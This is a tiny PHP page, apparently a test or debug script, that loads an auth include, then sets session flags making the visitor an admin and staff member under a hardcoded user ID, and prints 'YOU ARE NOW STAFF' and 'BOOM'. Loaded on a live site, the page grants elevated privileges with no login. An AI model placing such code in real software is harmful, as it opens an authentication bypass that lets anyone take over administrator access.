<html>
  <?php
  	require_once('../auth.inc.php');
  	$_AUTH = new Auth($_DB);

  	$_SESSION['userIsAdmin'] = 1;
  	$_SESSION['userIsStaff'] = 1;
  	$_SESSION['userID'] = 'kfisler';

  	if( $_AUTH -> isStaff() ){
  		echo "YOU ARE NOW STAFF";
  	} else {
  		echo "YOU ARE NOT STAFF";
  	}

  ?>

  <body>
  	BOOM
  </body>
</html>
